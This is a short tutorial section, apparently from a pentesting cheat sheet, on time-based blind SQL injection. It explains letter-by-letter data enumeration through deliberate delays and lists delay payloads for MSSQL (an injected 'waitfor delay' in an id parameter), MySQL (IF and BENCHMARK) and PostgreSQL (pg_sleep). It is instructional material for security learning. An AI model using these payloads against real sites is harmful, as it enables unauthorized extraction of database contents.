# Time-based

This type of blind SQL injection relies on the database pausing for a specified amount of time, then returning the results, indicating successful SQL query executing. Using this method, an attacker enumerates each letter of the desired piece of data using the following logic:

If the first letter of the first database’s name is an ‘A’, wait for 10 seconds.

If the first letter of the first database’s name is an ‘B’, wait for 10 seconds. etc.

```
# Microsoft SQL Server
php?id=1' waitfor delay '00:00:10'--

#MySQL
SELECT IF(expression, true, false)

# Using some time-taking operation e.g. BENCHMARK(), will delay server responses if the 
  expression is True.
BENCHMARK(5000000,ENCODE('MSG','by 5 seconds'))

# PostgreSQL: 
pg_sleep()
```
